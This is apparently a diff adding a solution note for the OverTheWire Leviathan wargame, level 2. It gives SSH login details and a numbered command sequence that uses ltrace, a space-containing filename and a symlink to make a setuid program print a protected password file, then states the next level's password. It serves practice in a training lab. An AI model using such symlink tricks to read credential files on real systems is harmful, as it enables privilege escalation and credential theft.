@@ -1,0 +1,31 @@
+
+*** Leviathan Level 2 ***
+
+GOAL:
+-----
+1)  There is no information for this level, intentionally.
+
+
+HINTS:
+------
+
+
+HELP:
+-----
+
+SOLUTIONS:
+----------
+1)  $ ssh -p 2223 leviathan2@leviathan.labs.overthewire.org
+2)  $ ougahZi8Ta
+3)  $ ll
+4)  $ mkdir /tmp/levi2
+5)  $ pwd
+6)  $ pushd /tmp/levi2
+7)  $ ln -s /home/leviathan2/printfile
+8)  $ touch file\ tmp.txt
+9)  $ ltrace ./printfile file\ tmp.txt
+10) $ ln -s /etc/leviathan_pass/leviathan3 file
+11) $ ./printfile file\ tmp.txt
+
+Password: Ahdiemoo1j
+
